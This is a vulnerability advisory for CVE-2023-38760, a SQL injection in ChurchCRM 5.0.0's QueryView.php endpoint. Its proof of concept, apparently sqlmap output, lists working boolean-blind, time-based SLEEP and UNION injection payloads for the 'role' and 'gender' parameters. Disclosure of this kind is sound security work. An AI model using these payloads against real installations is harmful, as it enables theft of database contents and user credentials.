# CVE-2023-38760 - SQL Injection in /QueryView.php?QueryID=7

|                 |                                                                                      |
| --------------- | --------------- |
| Researchers     | Rowan Crowley                                                               |
| Severity        | TBD                                   |
| Published       | TBD         |
| Software Link   | https://github.com/ChurchCRM/CRM             |

## Description
A SQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive database information via the `role` and `gender` parameters within the `/QueryView.php` endpoint. An authenticated attacker can use injection to perform arbitrary SQL queries via POST request with the `role` parameter or the `gender` parameter at the `/QueryView.php?QueryID=7` endpoint (Person by Role and Gender query). This can be used for information disclosure of anything in the database, including user credentials.

## Proof of Concept
    Parameter: role (POST)
        Type: boolean-based blind
        Title: AND boolean-based blind - WHERE or HAVING clause
        Payload: role=1 AND 6854=6854&gender=1&Submit=Execute Query
    
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: role=1 AND (SELECT 5479 FROM (SELECT(SLEEP(5)))eRaH)&gender=1&Submit=Execute Query
    
        Type: UNION query
        Title: Generic UNION query (NULL) - 2 columns
        Payload: role=1 UNION ALL SELECT NULL,CONCAT(0x716b717171,0x696c717071536943724b796764734b6d66724d4e6559466e5965464542684f666845647063476c64,0x717a787871)-- -&gender=1&Submit=Execute Query
    
    
    Parameter: gender (POST)
        Type: boolean-based blind
        Title: AND boolean-based blind - WHERE or HAVING clause
        Payload: role=1&gender=1 AND 2918=2918&Submit=Execute Query
    
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: role=1&gender=1 AND (SELECT 8533 FROM (SELECT(SLEEP(5)))EysZ)&Submit=Execute Query
    
        Type: UNION query
        Title: Generic UNION query (NULL) - 2 columns
        Payload: role=1&gender=1 UNION ALL SELECT NULL,CONCAT(0x716b717171,0x527a74526b716f6e6b6f5573475670726d674175674676676f446f547747794f717547636f446171,0x717a787871)-- -&Submit=Execute Query
